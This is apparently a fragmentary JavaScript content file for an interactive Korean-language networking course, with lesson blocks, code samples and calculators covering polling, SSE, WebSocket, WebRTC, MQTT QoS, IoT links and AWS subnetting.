    (p.pending != null ? `<p style="margin:6px 0 0" class="cbad">⚠ 아직 디스패치되지 않은 data: <code>${esc(p.pending).replace(/\n/g, '⏎')}</code> — 이벤트 끝의 빈 줄(\\n\\n)이 없어서 브라우저는 계속 기다린다.</p>` : '') +
    `<p class="cm" style="margin:6px 0 0;font-size:13.5px">${p.retry != null ? `retry = ${p.retry}ms 후 재연결 · ` : ''}재연결 시 보낼 Last-Event-ID: <b>${esc(p.lastId || '(없음)')}</b> · 줄 끝(\\n)으로 끝나지 않은 마지막 줄은 아직 도착하지 않은 것으로 본다</p>`;
}
const enc = new TextEncoder();
async function wsAccept(key) { const h = await crypto.subtle.digest('SHA-1', enc.encode(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11')); return btoa(String.fromCharCode(...new Uint8Array(h))); }

{ id: 'w7.polling', title: 'Polling — 주기적으로 물어보기와 그 비용', slides: 'S8–S9',
  blocks: [
    H.pre(`// polling.js — 3초마다 새 경보 확인
let since = 100;
setInterval(async () => {
  const r = await fetch(\`/alerts?since=\${since}\`);
  const items = await r.json();
  if (items.length) {
    since = items.at(-1).id;      // 마지막으로 본 id (커서)
    items.forEach(showAlert);
  }
}, 3000);`),
    `<div class="pair"><div><h4 class="cok">장점</h4>${lines(['기존 HTTP · REST · 캐시 · 인증 그대로', '방화벽 · 프록시 문제 거의 없음', '서버가 상태(연결)를 기억할 필요 없음'])}</div><div><h4 class="cbad">단점</h4>${lines(['평균 지연 = <b>주기/2</b>', '대부분 응답이 빈 응답(낭비)', '사용자 수 × 빈도만큼 서버 부하'])}</div></div>`,
    H.note('since=100(커서)을 보내는 이유: 서버가 “이 클라이언트가 어디까지 봤는지” 기억하지 않아도 된다 → Stateless 유지 (5주차).'),
    { lab: { title: 'Polling 비용 계산기 — “3초마다 확인”이 1만 명이 되면', init: { n: 10000, t: 3, ev: 60 },
      ctl: [{ k: 'n', type: 'range', label: '동시 접속자 N', min: 100, max: 100000, step: 100 }, { k: 't', type: 'range', label: 'Polling 주기 T', unit: '초', min: 0.2, max: 60, step: 0.2 }, { k: 'ev', type: 'range', label: '실제 이벤트 간격', unit: '초', min: 1, max: 600 }],
      out: st => { const rps = st.n / st.t, kb = 1.1, mbps = rps * kb * 8 / 1000, perMin = rps * 60, useful = Math.min(1, st.t / st.ev);
        const v = st.t <= 0.4 ? ['bad', '사실상 DoS'] : st.t <= 1 ? ['bad', '서버 · DB 부담 큼'] : st.t <= 5 ? ['', '작은 서비스면 OK'] : st.t <= 30 ? ['ok', '대시보드 OK, 경보 X'] : ['ok', '변화가 드문 작업 확인용'];
        return T(['지표', '계산', '값'], [['요청률', 'N / T', `<b>${fmt(rps)} req/s</b>`], ['트래픽', '요청률 × 1.1 KB (요청 헤더 800 B + 빈 응답 300 B)', `${fmt(rps * kb / 1000)} MB/s ≈ ${fmt(mbps)} Mbps`], ['1분 동안 요청', '요청률 × 60', `${fmt(perMin)}번`], ['쓸모 있는 응답', 'T / 이벤트 간격', `${(useful * 100).toFixed(useful < .1 ? 1 : 0)}%`], ['평균 감지 지연', 'T / 2', `<b>${fmt(st.t / 2)}초</b> (최악 ${fmt(st.t)}초)`]]) +
          `<div class="verdict ${v[0]}">${v[1]}</div><p style="margin:0">주기를 줄이면 지연은 줄지만 요청 수는 그만큼 늘어난다 — <b>둘을 동시에 줄일 수 없다</b>.</p>`; } } },
    T(['주기 T', '요청률 (N=1만)', '평균 지연', '판단'], [['30초', '333 req/s', '15초', '대시보드 OK, 경보 X'], ['3초', '3,333 req/s', '1.5초', '작은 서비스면 OK'], ['1초', '10,000 req/s', '0.5초', '서버 · DB 부담 큼'], ['0.2초', '50,000 req/s', '0.1초', '사실상 DoS']]),
    H.key('Polling의 비용은 <b>(사용자 수 ÷ 주기)</b>에 비례하고, 지연은 <b>주기</b>에 비례한다. 이 트레이드오프를 깨는 것이 Push 방식이다.<br>주기를 3초 → 1초로 줄이면 → 요청 수 <b>3배 증가</b>, 평균 지연 1.5초 → 0.5초.'),
    H.note('Polling이 “정답”인 경우도 있다 — 변화가 드물고 몇 초 늦어도 되는 경우(빌드 상태, 결제 처리 결과, 202 Accepted 후 완료 확인). 개선: 변화 없으면 주기를 늘리는 Adaptive polling, ETag + 304로 응답 크기 축소.'),

{ id: 'w7.long', title: 'Long Polling — 답이 생길 때까지 기다리기', slides: 'S10',
  blocks: [
    { trace: { mode: 'ladder', title: '서버가 즉시 답하지 않고 응답을 보류한다', side: 110, rowH: 52,
      lanes: [{ id: 'b', label: 'Browser' }, { id: 's', label: 'Server (async)' }],
      events: [
        { from: 'b', to: 's', label: 'GET /alerts/wait?since=100', color: 'l7', pkt: [req('GET /alerts/wait?since=100')], say: '요청을 보낸다. 서버는 새 경보가 없으면 <b>응답을 보류</b>한다 (최대 30초).' },
        { from: 's', to: 's', label: '응답 보류… ⚡ 경보 #101', color: 'bad', say: '기다리는 중에 경보가 생겼다.' },
        { from: 's', to: 'b', label: '200 [#101] ← 즉시', color: 'ok', say: '지연 ≈ 네트워크 왕복 시간. Polling처럼 주기를 기다리지 않는다.' },
        { from: 'b', to: 's', label: 'GET /alerts/wait?since=101 (바로 재요청)', color: 'l7', say: '받으면 <b>바로 다시</b> 줄을 선다 — 메시지마다 재요청 + 헤더.' },
        { from: 's', to: 'b', label: '204 No Content (30초 타임아웃)', color: 'l4', pkt: [res('204 No Content')], say: '30초 동안 아무 일이 없으면 빈 응답으로 끝내고 클라이언트가 다시 요청. 프록시 타임아웃(60초 등)보다 짧게.' },
      ] } },
    H.pre(`# FastAPI — 새 경보를 최대 30초 기다림
new_alert = asyncio.Event()
@app.get("/alerts/wait")
async def wait_alerts(since: int):
    if has_newer(since):              # 이미 있으면 즉시
        return newer_than(since)
    try:
        await asyncio.wait_for(new_alert.wait(), 30)
    except asyncio.TimeoutError:
        return Response(status_code=204)
    return newer_than(since)`),
    `<div class="pair"><div><h4 class="cok">좋아진 점</h4>${lines(['지연 ≈ 네트워크 왕복 시간', '빈 응답이 크게 줄어듦', '그냥 HTTP라 어디서나 동작'])}</div><div><h4 class="cbad">남은 문제</h4>${lines(['대기 중 요청 = 서버 자원 점유', '메시지마다 재요청 + 헤더', '프록시 타임아웃(60초 등) 주의'])}</div></div>`,

        { from: 'b', to: 's', label: '⚠ 끊김 → 3초 후 자동 재연결', color: 'l7', pkt: [req('GET /events', [['Last-Event-ID', '42']])], say: '연결이 끊기면 브라우저가 <b>retry</b>만큼 기다렸다 <b>자동 재연결</b>하고, 마지막 id를 <b>Last-Event-ID</b> 헤더로 보낸다 → 서버는 43번부터 이어서 보낸다.' },

{ id: 'w7.ssecode', title: 'SSE 구현 · LLM 스트리밍 · 실무 함정', slides: 'S13–S15',
  blocks: [
    `<div class="pair"><div><h4>Server — FastAPI</h4>${H.pre(`async def sensor_stream(request: Request):
    eid = 0
    yield "retry: 3000\\n\\n"
    while True:
        if await request.is_disconnected():   # 탭 닫힘
            break
        eid += 1
        msg = json.dumps({"room": 301, "temp": temp()})
        yield f"id: {eid}\\ndata: {msg}\\n\\n"  # 빈 줄 필수!
        await asyncio.sleep(1)

@app.get("/events")
async def events(request: Request):
    return StreamingResponse(sensor_stream(request),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache",
                 "X-Accel-Buffering": "no"})  # nginx 버퍼링 끔`)}</div><div><h4>Client — Browser</h4>${H.pre(`const es = new EventSource("/events");
es.onmessage = (e) => {
  const d = JSON.parse(e.data);
  t.textContent = d.temp + " °C";
};
es.addEventListener("alert", (e) => alert(e.data));
es.onerror = () => console.log("재연결 시도 중…");`)}<p class="cm" style="font-size:13.5px">직접 확인: <code>curl -N localhost:8000/events</code> (-N: 버퍼링 끄기) · DevTools → Network → EventStream 탭</p></div></div>`,
    H.note('같은 Origin이 아니면 SSE도 CORS 대상이다(5주차). 쿠키를 보내려면 <code>new EventSource(url, {withCredentials: true})</code> + 서버 Allow-Credentials.'),
    { h3: 'SSE를 매일 쓰고 있다 — AI 챗봇의 타자 효과 (S14)' },
    { lab: { title: 'LLM 토큰 스트리밍 — 형식은 SSE, 수신은 fetch', init: { k: 4 },
      ctl: [{ k: 'k', type: 'range', label: '받은 이벤트 수', min: 0, max: 5 }],
      out: st => { const toks = ['TCP', '는 ', '신뢰성', ' 있는 전송…'], t = [0.4, 0.45, 0.5, 0.55];
        const stream = ['HTTP/1.1 200 OK', 'Content-Type: text/event-stream', '', ...toks.map(x => `data: {"delta": "${x}"}\n`), 'data: [DONE]'];
        const shown = Math.min(st.k, 5), text = toks.slice(0, Math.min(shown, 4)).join('');
        return `<div class="pair"><div>${H.pre('POST /v1/chat   {"stream": true, "messages": [...]}\n\n' + stream.slice(0, 3 + shown).join('\n'))}</div><div><h4>사용자 화면</h4><div style="font-size:20px;min-height:40px;padding:10px;border:1px solid var(--line);border-radius:8px">${esc(text)}${shown < 5 ? '<span style="animation:blink 1s steps(1) infinite">▌</span>' : ''}</div><p class="cm" style="font-size:13.5px">${shown ? `${shown <= 4 ? t[shown - 1] + '초' : '완료'} — 첫 글자는 0.4초에 보인다 (TTFT)` : '요청 직후'}</p></div></div>`; } } },
    T(['질문', '답'], [['왜 스트리밍인가', '답변 완성까지 10초 → 첫 글자는 0.4초. 체감 지연(<b>TTFT</b>, Time To First Token)이 크게 준다'], ['왜 WebSocket이 아닌가', '질문 1번 → 답변 스트림 1번. <b>서버→클라이언트 단방향</b>이면 충분하다'], ['왜 EventSource가 아닌가', '질문을 <b>POST Body</b>로 보내야 함 → <code>fetch()</code> + ReadableStream으로 직접 읽는다']]),
    H.key('형식은 SSE, 수신은 fetch — “<b>SSE 형식 ≠ EventSource API</b>”를 구분하자.'),

{ id: 'w7.frame', title: 'WebSocket Frame 구조 — 헤더는 2~14바이트', slides: 'S19',
  blocks: [

    { lab: { title: 'Frame 헤더 크기 계산기', init: { len: 10, dir: 'c2s' },
      ctl: [{ k: 'len', type: 'num', label: 'Payload 길이', unit: 'B', min: 0, max: 100000000 }, { k: 'dir', type: 'select', label: '방향', opts: [['c2s', '브라우저 → 서버 (MASK 필수)'], ['s2c', '서버 → 브라우저']] }],
      out: st => { const L = +st.len, ext = L <= 125 ? 0 : L <= 65535 ? 2 : 8, m = st.dir === 'c2s' ? 4 : 0, hdr = 2 + ext + m;
        return T(['부분', '바이트', '이유'], [['기본 (FIN · opcode · MASK · len7)', '2', '항상'], ['Extended length', String(ext), L <= 125 ? '0~125는 7비트에 그대로' : L <= 65535 ? '126 → 다음 16비트가 길이 (최대 64KB)' : '127 → 다음 64비트가 길이'], ['Masking key', String(m), m ? '브라우저→서버 Frame은 반드시 마스킹 (프록시 캐시 오염 방지 — 암호화 아님)' : '서버→브라우저는 마스킹 안 함'], ['<b>헤더 합계</b>', `<b>${hdr}</b>`, `Payload ${fmt(L)} B + 헤더 ${hdr} B`]]) +
          `<p style="margin:0">예: <code>{"t":24.5}</code>(10바이트)는 헤더 2바이트(+마스크 4)면 된다. 같은 내용을 HTTP Polling으로 받으면 요청 · 응답 헤더만 수백~1,000바이트.</p>`; } } },

{ id: 'w7.wsops', title: 'WebSocket 구현과 연결 수명 관리 — Heartbeat · Close Code · 재연결', slides: 'S20–S21',
  blocks: [
    H.pre(`# ws_server.py — 강의실 채팅 (FastAPI)
rooms: dict[str, set[WebSocket]] = {}      # 방 → 연결들 (서버 메모리 상태!)
@app.websocket("/ws/{room}")
async def chat(ws: WebSocket, room: str):
    if ws.headers.get("origin") not in ALLOWED_ORIGINS:
        await ws.close(code=1008); return  # 정책 위반
    await ws.accept()                       # ← 여기서 101 응답
    rooms.setdefault(room, set()).add(ws)
    try:
        while True:
            msg = await ws.receive_json()   # Text Frame 수신
            for peer in list(rooms[room]):  # broadcast
                await peer.send_json({"room": room, **msg})
    except WebSocketDisconnect:
        rooms[room].discard(ws)             # 연결 정리 필수`),
    H.note('확인: DevTools → Network → WS 필터 → Messages 탭(↑ 보낸 Frame / ↓ 받은 Frame) · 탭 2개 열어 보기 · <code>websocat ws://localhost:8000/ws/301</code>. rooms 딕셔너리는 서버 메모리 상태 — 서버가 1대일 때만 동작한다 (7.11).'),
    H.cards([['① Heartbeat', 'NAT · 프록시 · LB는 조용한 TCP 연결을 수십 초~수 분 후 말없이 끊는다.<br>서버가 20~30초마다 Ping → 브라우저가 자동 Pong. Pong이 안 오면 죽은 연결로 정리.', ''], ['② Close code', '1000 정상 · 1001 떠남(탭 닫기 · 재시작)<br><b>1006 비정상 — Close Frame 없이 끊김</b><br>1008 정책 위반(Origin · 인증) · 1009 너무 큼 · 1011 서버 오류', 'L3'], ['③ Reconnect', '지수 백오프 + 지터.<br>재연결 후 놓친 메시지 복구 — 마지막 id를 보내 “그 이후 것” 요청 (SSE의 Last-Event-ID를 직접 구현).', 'L7']]),
    { lab: { title: '재연결 간격 — 지수 백오프 + 지터', init: { jit: true, seed: 1 },
      ctl: [{ k: 'jit', type: 'toggle', label: '지터(무작위) 섞기' }, { type: 'btns', items: [{ label: '다시 뽑기', act: st => st.seed++ }] }],
      out: st => { const R = rngFrom(st.seed * 7919), clients = 6, tries = 7;
        const rows = []; for (let c = 0; c < clients; c++) { let t = 0; const pts = []; for (let n = 0; n < tries; n++) { const base = Math.min(30000, 1000 * 2 ** n), d = st.jit ? base * (0.5 + R()) : base; t += d; pts.push(t / 1000); } rows.push(pts); }
        const max = Math.max(...rows.flat());
        return `<div style="position:relative;height:${clients * 22 + 24}px;border:1px solid var(--line);border-radius:8px;background:var(--sunk)">${rows.map((pts, c) => pts.map(x => `<span title="${x.toFixed(1)}s" style="position:absolute;left:calc(${x / max * 96}% + 2%);top:${8 + c * 22}px;width:9px;height:9px;border-radius:50%;background:var(--${['l3', 'l7', 'l4', 'ok', 'bad', 'l1'][c]})"></span>`).join('')).join('')}<span class="cm" style="position:absolute;right:8px;bottom:2px;font-size:11px">${max.toFixed(0)}초</span></div>` +
          `<p style="margin:6px 0 0">간격: 1s → 2s → 4s → 8s → 16s → 30s → 30s (상한). ${st.jit ? '점들이 흩어져 있다 — 서버가 재시작돼도 1만 명이 <b>같은 순간</b>에 몰리지 않는다.' : '<b class="cbad">지터 없음</b> — 6개 클라이언트가 정확히 같은 순간에 재접속한다. 1만 명이면 서버가 다시 쓰러진다 = <b>thundering herd</b>.'}</p>`; } } },
    H.pre(`// 지수 백오프 + 지터 재연결
let n = 0;
function connect() {
  const ws = new WebSocket(URL);
  ws.onopen  = () => { n = 0; };
  ws.onclose = (e) => {
    if (e.code === 1000) return;                       // 정상 종료면 재연결 안 함
    const d = Math.min(30000, 1000 * 2 ** n++) * (0.5 + Math.random());
    setTimeout(connect, d);
  };
}`),
  ] },

    H.key('인증은 핸드셰이크 시점 <b>한 번만</b> 일어난다 — 연결이 살아 있는 동안 권한이 바뀌거나 토큰이 만료되는 경우를 별도로 설계해야 한다.'),

    { trace: { title: 'A 서버에 붙은 kim의 메시지를 B 서버에 붙은 lee에게', sub: 'Redis Pub/Sub backplane', rowH: 88,
      nodes: [{ id: 'k', label: 'kim', icon: 'laptop', x: .03, y: 0 }, { id: 'l', label: 'lee', icon: 'phone', x: .03, y: 1 }, { id: 'lb', label: 'Load Balancer', icon: 'lb', x: .26, y: .5 }, { id: 'a', label: 'WS Server A', sub: '{kim, park}', icon: 'server', x: .52, y: 0 }, { id: 'b', label: 'WS Server B', sub: '{lee}', icon: 'server', x: .52, y: 1 }, { id: 'r', label: 'Redis Pub/Sub', sub: 'backplane', icon: 'broker', x: .9, y: .5 }],
      links: [['k', 'lb'], ['l', 'lb'], ['lb', 'a'], ['lb', 'b'], ['a', 'r'], ['b', 'r']],
      events: [
        { from: 'k', to: 'a', label: '① kim 메시지 → A', color: 'l7', say: 'kim은 A 서버에 연결되어 있다. A의 메모리에는 lee가 없다 — backplane이 없다면 여기서 끝.' },
        { from: 'a', to: 'r', label: '② publish', color: 'l4', say: '모든 WS 서버가 Redis(또는 MQTT · Kafka)의 같은 채널을 구독한다. A가 채널에 발행.' },
        { from: 'r', to: 'b', label: '③ 구독자에게', color: 'l4', say: 'B도 그 채널의 구독자라 메시지를 받는다.' },
        { from: 'b', to: 'l', label: '④ B가 lee에게 전송', color: 'ok', say: '어느 서버에서 들어온 메시지든 모두에게 퍼진다.' },
      ] } },
    T(['문제', '해결'], [['서버마다 연결 목록이 다름', '<b>Pub/Sub backplane</b>으로 메시지 공유'], ['재연결 시 다른 서버로 감', '상태는 Redis · DB에, 서버는 연결만 (5주차 Stateless)'], ['서버 배포 시 연결이 모두 끊김', 'Graceful shutdown(1001) + 클라이언트 지터 재연결']]),
    H.pre(`# nginx — Upgrade 헤더 전달 필수 (빠지면 핸드셰이크 400/426)
location /ws/ {
  proxy_pass http://ws_backend;
  proxy_http_version 1.1;
  proxy_set_header Upgrade $http_upgrade;
  proxy_set_header Connection "upgrade";
  proxy_read_timeout 3600s;     # 기본 60s면 정확히 60초마다 끊김
}`),

  ] },

{ id: 'w7.cmp', title: 'Polling · Long Polling · SSE · WebSocket 한눈에', slides: 'S24–S25',

    H.key('고르는 첫 질문: “<b>클라이언트도 자주 보내는가?</b>” — 아니면 SSE부터 검토, 그렇다면 WebSocket. 변화가 드물면 Polling도 충분한 답이다.'),
    { lab: { title: '10바이트 센서 값 {"t":24.5} 1개를 받는 데 오가는 바이트 (S25)', init: { per: 10 },
      ctl: [{ k: 'per', type: 'range', label: 'Polling 1초 주기, 이벤트는 몇 초에 1번?', min: 1, max: 60 }],

          `<p style="margin:6px 0 0">Polling은 이벤트 1개에 ${st.per}번 요청해 1번 쓸모 → <b>${fmt(poll / sse)}배</b>(SSE 대비). 센서 1만 개 × 초당 1개라면 차이는 Mbps 단위 → 모바일 데이터 · 배터리 · 서버 비용. (가정: 요청 헤더 800 B + 응답 헤더 300 B, SSE ≈ 40 B, WS = 10 + 2 + 마스크 4 B)</p>`; } } },
  ] },

{ id: 'w7.rtc', title: 'WebRTC — 브라우저끼리 직접, 서버는 “소개”만', slides: 'S26–S27',
  blocks: [

    H.warn('WebRTC에는 <b>Signaling 방법이 정해져 있지 않다</b> — 보통 앞에서 배운 WebSocket으로 직접 구현한다. 이번 주 기술들이 서로 부품이 되는 지점.'),
    { trace: { mode: 'ladder', title: 'Offer · Answer · ICE — 미디어 조건과 도달 가능한 주소 교환', side: 96, rowH: 50,
      lanes: [{ id: 'a', label: 'Peer A' }, { id: 'st', label: 'STUN' }, { id: 'sg', label: 'Signaling', sub: 'WebSocket' }, { id: 'b', label: 'Peer B' }],
      events: [
        { from: 'a', to: 'st', label: '① 내 공인 주소는?', color: 'l4', say: 'A는 NAT 뒤에 있어 자기 바깥 주소를 모른다.' },
        { from: 'st', to: 'a', label: '203.0.113.7:54321', color: 'l4', say: '“밖에서 보면 너는 203.0.113.7:54321” — <b>srflx</b> 후보.' },
        { from: 'a', to: 'sg', label: '② Offer (SDP)', color: 'l7', pkt: [ev('SDP Offer', [['m=', 'audio · video'], ['codec', 'opus · VP8'], ['fingerprint', 'DTLS 인증서 지문']])], say: '<b>SDP</b> = 세션 설명서 — 코덱, 미디어 종류, 암호화 지문. “이렇게 통화하자”.' },
        { from: 'sg', to: 'b', label: 'Offer 전달', color: 'l7', say: 'Signaling 서버는 <b>전달만</b> 한다. 통화 내용은 모른다.' },

  ] },

{ id: 'w7.nat', title: 'STUN · TURN — 아파트 안의 두 친구가 통화하기 · Mesh · SFU · MCU', slides: 'S28–S29',
  blocks: [
    T(['#', '역할', '비유', '하는 일'], [['1', '<b>Signaling 서버</b>', '공통 친구 · 메신저', '서로의 정보를 전달만. 통화 내용은 모름'], ['2', '<b>STUN 서버</b>', '건물 밖 거울', '“밖에서 보면 너는 203.0.113.7 아파트 54321호” — 바깥 주소를 알려 줌. 가볍고 싸다'], ['3', 'Hole punching', '동시에 문 두드리기', '양쪽이 동시에 상대 바깥 주소로 보내 NAT 테이블에 “통로”를 만든다'], ['4', '<b>TURN 서버</b>', '중계 교환원', '직접 안 되면 <b>모든 대화를 대신 전달</b>. 확실하지만 대역폭 비용이 큼']]),
    H.key('STUN = “내 바깥 주소 알려 줘”(미디어는 안 거침) · TURN = “직접 안 되니 대신 중계해 줘”(미디어가 거침). 대부분의 연결은 STUN만으로 성공하지만 기업망 · 모바일망 일부는 TURN이 꼭 필요하다 — “같은 Wi-Fi에선 되는데 LTE에선 안 돼요” = TURN 서버 없음을 의심.'),
    H.warn('STUN 서버는 미디어를 중계하지 않는다 — 시험 함정. 중계는 TURN.'),
    { h3: '참가자가 늘어나면 — Mesh · SFU · MCU (S29)' },
    { lab: { title: '회의 인원과 영상 비트레이트로 계산', init: { n: 5, br: 1.5 },
      ctl: [{ k: 'n', type: 'range', label: '참가자 N', min: 2, max: 12 }, { k: 'br', type: 'range', label: '영상 1개', unit: 'Mbps', min: 0.3, max: 4, step: 0.1 }],
      out: st => { const n = st.n, b = st.br;
        const rows = [['Mesh (P2P)', 'N−1개 업로드 · N−1개 다운로드', (n - 1) * b, (n - 1) * b, `${n * (n - 1) / 2}개 연결`, '2~4명 소규모'], ['SFU', '업로드 1개 · 다운로드 N−1개 (서버는 골라서 전달만, 디코딩 X)', b, (n - 1) * b, `서버 연결 ${n}개`, 'Zoom · Meet 류 대부분'], ['MCU', '업 · 다운 각 1개 (서버가 영상을 합성)', b, b, '서버 CPU 부담 큼', '저사양 단말 · 녹화']];
        return T(['구조', '스트림', '내 업로드', '내 다운로드', '비고', '적합'], rows.map(r => [`<b>${r[0]}</b>`, r[1], `<b class="${r[2] > 5 ? 'cbad' : ''}">${fmt(r[2])} Mbps</b>`, `${fmt(r[3])} Mbps`, r[4], r[5]])) +
          `<p style="margin:0">Mesh에서 ${n}명 회의의 업로드 = ${n - 1} × ${b} = <b>${fmt((n - 1) * b)} Mbps</b>. ${(n - 1) * b > 5 ? '가정용 업로드로는 버겁다 → SFU가 표준이 된 이유.' : '이 정도면 Mesh도 가능하다.'}</p>`; } } },
  ] },

{ id: 'w7.iot', title: 'IoT 네트워크는 무엇이 다른가 · 기술 지도', slides: 'S30–S31',
  blocks: [
    T(['제약', '내용', '숫자'], [['① 배터리', '코인 전지로 1~수년. 무선 송신이 전력의 대부분 → 보내는 바이트 · 깨어 있는 시간을 줄여야', 'ESP32 Wi-Fi 송신 ≈ 수백 mA · 딥슬립 ≈ 수십 µA'], ['② 작은 컴퓨터', 'MCU의 RAM은 수백 KB. 무거운 HTTP 라이브러리 · JSON · TLS도 부담', 'ESP32 SRAM ≈ 520 KB'], ['③ 불안정한 링크', '신호 약함 · 이동 · 간섭으로 수시로 끊긴다. <b>끊겼다 붙는 것이 정상</b>', '재연결 · 세션 · 메시지 보관 필수'], ['④ 들어오는 연결 불가', 'NAT · 이동통신망 뒤 → 서버가 먼저 접속 못 함', '기기가 바깥으로 연결을 열어 둠'], ['⑤ 많은 수 · 다대다', '센서 수천 개 → 대시보드 · DB · 알람 · AI가 동시에', '요청-응답보다 <b>발행-구독</b>']]),
    H.key('IoT 프로토콜의 공통 목표: 작은 헤더 · 오래 유지되는 바깥 방향 연결 · 끊김에 강한 전달 보장 · 다대다 배포 — <b>MQTT가 정확히 이 조합</b>이다.'),
    T(['링크 기술', '거리', '속도', '전력', '대표 용도'], [['BLE', '~10~50 m', '~1~2 Mbps', '매우 낮음', '웨어러블 · 스마트폰 연동'], ['Wi-Fi', '~50 m', '수십~수백 Mbps', '높음', '카메라 · 가전 · ESP32'], ['Zigbee / Thread', '~10~100 m (메시)', '250 kbps', '낮음', '스마트홈 조명 · 센서'], ['LoRaWAN', '수 km~15 km', '수 kbps 이하', '매우 낮음', '농업 · 계량기 · 원격지'], ['NB-IoT / LTE-M', '셀룰러 전국망', '수십 kbps~1 Mbps', '낮음', '스마트 미터 · 물류'], ['5G / LTE', '셀룰러', '수백 Mbps~', '높음', '차량 · 영상 · 산업']]),
    { fig: `<div class="stack" style="max-width:560px">${[['l7', 'Application', 'MQTT · CoAP · HTTP · WebSocket'], ['l4', 'Transport', 'TCP (MQTT) · UDP (CoAP)'], ['l3', 'Network', 'IP · IPv6 · 6LoWPAN'], ['l1', 'Link / PHY', 'Wi-Fi · BLE · Zigbee · LoRa · LTE']].map(([c, a, b]) => `<div style="background:var(--${c})">${a} <span>${b}</span></div>`).join('')}</div>`, cap: 'BLE · Zigbee · LoRa 기기는 IP 인터넷에 직접 못 붙는다 → 스마트폰 · 허브 · 게이트웨이가 받아 MQTT/HTTP로 전달. Wi-Fi · LTE 기기(ESP32)는 IP가 있어 브로커에 직접 연결.' },
    H.warn('“BLE냐 MQTT냐?”는 잘못된 질문 — <b>BLE는 무선 링크, MQTT는 메시지 프로토콜</b>로 다른 계층이다. 실제 제품은 “BLE 센서 → 폰 → MQTT → 서버”처럼 함께 쓴다.'),
  ] },

{ id: 'w7.qos', title: 'QoS 0 · 1 · 2 — 전달 보장의 3단계', slides: 'S38–S39',
  blocks: [
    { lab: { title: 'QoS를 고르면 패킷 흐름이 보인다', init: { q: '1', lost: true },
      ctl: [{ k: 'q', type: 'select', label: 'QoS', opts: [['0', 'QoS 0 — At most once'], ['1', 'QoS 1 — At least once'], ['2', 'QoS 2 — Exactly once']] }, { k: 'lost', type: 'toggle', label: '첫 확인 응답이 유실됨' }],
      out: st => { const S = { '0': [['→', 'PUBLISH'], st.lost ? null : null], '1': st.lost ? [['→', 'PUBLISH (id=7)'], ['✕', 'PUBACK (7) 유실'], ['→', 'PUBLISH (id=7, DUP=1) 재전송'], ['←', 'PUBACK (7)']] : [['→', 'PUBLISH (id=7)'], ['←', 'PUBACK (7)']], '2': st.lost ? [['→', 'PUBLISH (id=9)'], ['✕', 'PUBREC (9) 유실'], ['→', 'PUBLISH (id=9, DUP=1)'], ['←', 'PUBREC (9) — 이미 받은 id라 중복 저장 안 함'], ['→', 'PUBREL (9)'], ['←', 'PUBCOMP (9)']] : [['→', 'PUBLISH (id=9)'], ['←', 'PUBREC (9)'], ['→', 'PUBREL (9)'], ['←', 'PUBCOMP (9)']] }[st.q].filter(Boolean);
        const v = { '0': ['최대 1번 · 유실 가능', '확인 없음. 끊기면 그냥 사라진다. 가장 빠르고 가볍다.', '1초마다 오는 온도 — 하나쯤 빠져도 다음 값이 온다', '1'], '1': ['최소 1번 · <b>중복 가능</b>', st.lost ? 'ACK가 유실되면 송신자는 받았는지 모르니 DUP=1로 다시 보낸다 → 수신자는 같은 메시지를 <b>2번 받는다</b>.' : 'ACK를 받으면 끝.', '경보 · 명령 — 대신 수신 측이 중복 처리(멱등성)', '2'], '2': ['정확히 1번 · 가장 느림', '4-way 핸드셰이크로 중복까지 제거. 왕복 2번, 양쪽이 상태(id)를 저장해야 한다.', '과금 · 재고 차감 — 중복이 치명적인 경우', '4'] }[st.q];
        return `<div class="pair"><div><h4>Sender → Receiver</h4><ol class="ln-list" style="list-style:none;padding:0">${S.map(([d, t]) => `<li class="mono" style="${d === '✕' ? 'color:var(--bad);text-decoration:line-through' : ''}">${d === '←' ? '&nbsp;&nbsp;&nbsp;← ' : d === '✕' ? '&nbsp;&nbsp;&nbsp;✕ ' : '→ '}${esc(t)}</li>`).join('')}</ol></div><div><h4>QoS ${st.q} — ${v[0]}</h4><p>${v[1]}</p><p class="cm" style="font-size:14px">용도: ${v[2]} · 정상 패킷 수 ${v[3]}</p></div></div>`; } } },
    T(['QoS', '우편 비유', '보장', '패킷'], [['0', '일반 우편 · 전단지 — 넣고 끝', 'At most once — 유실 가능', '1'], ['1', '등기 우편 — 서명이 분실되면 한 통 더 → 두 통 받을 수 있음', 'At least once — 중복 가능', '2'], ['2', '내용증명 + 수령 확인 — 보냈다 · 받았다 · 확인했다 · 완료', 'Exactly once', '4']]),
    H.key('실제 적용 QoS = <b>min(발행 QoS, 구독 QoS)</b>. QoS는 구간별(Pub↔Broker, Broker↔Sub)로 적용된다 — 센서가 QoS 2로 보내도 대시보드가 QoS 0으로 구독했다면 Broker→대시보드 구간은 QoS 0.'),
    H.note('QoS 2가 항상 최선은 아니다 — 대부분 <b>QoS 1 + 수신 측 중복 제거</b>(메시지 고유 id, 이미 처리한 id는 무시)로 같은 효과를 더 싸게 얻는다. 4주차 Idempotency-Key와 같은 아이디어.'),
  ] },

        { from: 'd', to: 'b', label: 'SUBSCRIBE devices/+/status', color: 'l7', say: '대시보드는 나중에 켜졌다.' },
        { from: 'b', to: 'd', label: 'online (retained — 즉시)', color: 'ok', say: '언제 켜도 retained 값으로 <b>현재 상태</b>를 바로 안다.' },

    H.note('Blast Radius(영향 범위) — 아래로 갈수록 드물지만 치명적. 예: API 서버 2대를 같은 AZ에 두면 서버 고장엔 버티지만 AZ 정전엔 같이 죽는다 → AZ a · c에 1대씩.'),

    { h3: 'AWS · Azure · GCP 용어 대응 (S10)' },

{ id: 'w9.cidr', title: 'CIDR 복습과 서브넷 IP 계산 — 256이 아니다', slides: 'S11–S12',
  blocks: [
    T(['CIDR', '고정 비트', '주소 수', '쓰임'], [['/16', '16', '65,536', 'VPC 최대 크기 (AWS)'], ['/18', '18', '16,384', '큰 VPC를 4등분'], ['/20', '20', '4,096', '대형 서브넷 (컨테이너)'], ['/22', '22', '1,024', '중형 서브넷'], ['/24', '24', '256', '일반적인 서브넷'], ['/26', '26', '64', '작은 서브넷 (2주차 실습)'], ['/28', '28', '16', 'VPC · 서브넷 최소 크기']], { mono: [0] }),
    H.key('주소 수 = <b>2^(32 − 접두사 길이)</b>. 접두사가 1 줄면 주소는 2배. 예: /20 → 2^12 = 4,096 · /16 안에 /24는 2^(24−16) = <b>256개</b>.'),
    { lab: { title: 'AWS 서브넷 계산기 — 예약 5개를 빼라', init: { c: '10.0.1.0/24', vpc: '10.0.0.0/16' },
